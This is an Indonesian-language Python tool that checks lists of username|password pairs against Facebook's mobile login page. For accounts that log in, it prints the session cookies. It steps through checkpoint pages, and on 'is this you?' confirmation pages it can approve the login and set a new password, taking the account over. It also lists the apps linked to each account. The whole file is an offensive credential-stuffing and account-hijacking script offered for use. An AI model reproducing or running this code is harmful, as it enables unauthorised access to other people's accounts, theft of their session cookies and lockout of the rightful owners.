#!/usr/bin/python3
#coding=utf-8

"""

Copyright © 2021 - 2023 | Latip176
Semua codingan dibuat oleh Latip176.

"""

import requests as req,re
from bs4 import BeautifulSoup as par

#data - data
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]

P = "\x1b[0;97m" 
M = "\x1b[0;91m"
H = "\x1b[0;92m"
K = "\x1b[0;93m"
B = "\x1b[0;94m"

BM = "\x1b[0;96m"

class Main(object):
	
	def __init__(self,url,file,cek,pww,ubah):
		self.url = url
		self.satua = False
		pwBaru.append(pww)
		ubahP.append(ubah)
		if(cek=="file"):
			self.file(file)
		elif(cek=="satu"):
			file = [file]
			self.satu(file)
	def file(self,file):
		print("[✓] Jumlah akun:",len(file),f"\n{BM}{'='*45}{P}\n")
		for data in file:
			data = data.replace("\n","")
			user,pw = data.split("|")
			self.user = user
			self.pw = pw
			print(f"[+] Check : {self.user} | {self.pw}")
			self.cek_opsi()
	def satu(self,file):
		for data in file:
			data = data.replace("\n","")
			user,pw = data.split("|")
			self.user = user
			self.pw = pw
			self.satua = True
			self.cek_opsi()
		
class Eksekusi(Main):
	
	def cek_opsi(self):
		global aman,cp,salah
		session=req.Session()
		session.headers.update({
			"Host":"mbasic.facebook.com",
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"accept-encoding":"gzip, deflate",
			"accept-language":"id-ID,id;q=0.9",
			"referer":"https://mbasic.facebook.com/",
			"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
		})
		soup=par(session.get(self.url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
		link=soup.find("form",{"method":"post"})
		for x in soup("input"):
			data.update({x.get("name"):x.get("value")})
		data.update({"email":self.user,"pass":self.pw})
		urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
		response=par(urlPost.text, "html.parser")
		if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
			print("[!] Nyalakan lalu matikan mode pesawat selama 2 Detik.")
		if "c_user" in session.cookies.get_dict():
			if "Akun Anda Dikunci" in urlPost.text:
				if self.satua==True:
					print(f"\r\33[1;33m[CP] {self.user} | {self.pw}								\33[37;1m\n",end="")
				print(f"\r[×] Akun sesi new					\n\n",end="")
			else:
				aman+=1
				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				if self.satua==True:
					print(f"\r{H}[OK] {self.user}|{self.pw}|{coki}{P}        ",end="")
				print(f"\r{H}[√] Akun Aman{P}\n[{K}={P}] Cookie: {BM}{coki}{P}                   \n\n",end="")
				print("[{BM}+{P}] Apk yang terkait:")
				self.cek_apk(session,coki)
		elif "checkpoint" in session.cookies.get_dict():
			cp+=1
			title=re.findall("\<title>(.*?)<\/title>",str(response))
			link2=response.find("form",{"method":"post"})
			listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
			for x in response("input"):
				if x.get("name") in listInput:
					data2.update({x.get("name"):x.get("value")})
			an=session.post(self.url+link2.get("action"),data=data2)
			response2=par(an.text,"html.parser")
			number=0
			cek=[cek for cek in response2.find_all("option")]
			if self.satua==True:
				print(f"\r\33[1;33m[CP] {self.user} | {self.pw}								\33[37;1m\n",end="")
			print(f"\r[{BM}!{P}] Terdapat {BM}{len(cek)}{P} opsi:\n",end="")
			if(len(cek)==0):
				if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
					coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
					if "y" in ubahP:
						self.ubah_pw(session,response,link2)
					else:
						print(f"\r[{H}√{P}] {H}Akun tap yes{P}\n[=] Cookie: {BM}{coki}{P}\n")
						print(f"[{BM}+{P}] {K}Apk yang terkait:{P}")
						self.cek_apk(session,coki)
				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
					print(f"\r[{M}×{P}] {M}Akun a2f on            {P}\n")
				else:
					print(f"{M}[!]Kesalahan!{P}")
			elif(len(cek)<=1):
				for x in range(len(cek)):
					number+=1
					opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
					print(f"\r[{number}]. {B}{''.join(opsi)}{P}\n",end="")
				print("")
			elif(len(cek)>=2):
				for x in range(len(cek)):
					number+=1
					opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
					print(f"\r[{number}]. {B}{''.join(opsi)}{P}\n",end="")
				print("")
			else:
				if "c_user" in session.cookies.get_dict():
					cp-=1
					aman+=1
					coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
					if self.satua==True:
						print(f"\r{H}[OK] {self.user}|{self.pw}|{coki}{P}        ",end="")
					print(f"[{BM}+{P}] Apk yang terkait:")
					self.cek_apk(session,coki)
					
		else:
			salah+=1
			print(f"\r{M}[!] Kata sandi salah atau sudah diubah          {P}\n")
	def ubah_pw(self,session,response,link2):
		dat,dat2={},{}
		but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
		for x in response("input"):
			if x.get("name") in but:
				dat.update({x.get("name"):x.get("value")})
		ubahPw=session.post(self.url+link2.get("action"),data=dat).text
		resUbah=par(ubahPw,"html.parser")
		link3=resUbah.find("form",{"method":"post"})
		but2=["submit[Next]","nh","fb_dtsg","jazoest"]
		if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
			for b in resUbah("input"):
				if b.get("name") in but2:
					dat2.update({b.get("name"):b.get("value")})
			dat2.update({"password_new":"".join(pwBaru)})
			an=session.post(self.url+link3.get("action"),data=dat2)
			coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
			print(f"\r[√] Akun tap yes -> password diubah!\n{H}[=] {self.user}|{''.join(pwBaru)}|{coki}{P}\n",end="")
			self.cek_apk(session,coki)
	def cek_apk(self,session,coki):
		hit1, hit2 = 0,0
		cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
		cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
		if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
			print(f"{P}[+] Apk yang terkait:")
			if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
				print(f"{P}[+] Apk aktif:")
				print("    [!] Ops! Tidak ada aplikasi aktif yang terkait di akun.")
			else:
				print(f"{P}[+] Apk aktif:")
				apkAktif = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek))
				ditambahkan = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek))
				for muncul in apkAktif:
					hit1+=1
					print(f"    [{BM}{hit1}{P}]. {H}{muncul} -> {ditambahkan[hit2]}{P}")
					hit2+=1
			if "Anda tidak memiliki aplikasi atau situs web kadaluarsa untuk ditinjau." in cek2:
				print(f"{P}[+] Apk kadaluarsa:")
				print("    [!] Ops! Tidak ada aplikasi kadaluarsa yang terkait diakun.")
			else:
				hit1,hit2=0,0
				print(f"{P}[+] Apk kadaluarsa:")
				apkKadaluarsa = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek2))
				kadaluarsa = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek2))
				for muncul in apkKadaluarsa:
					hit1+=1
					print(f"    [{BM}{hit1}{P}]. {K}{muncul} -> {kadaluarsa[hit2]}{P}")
					hit2+=1
		else:
			print(f"[{BM}×{P}] {M}Cookies Invalid{P}")
		print("")
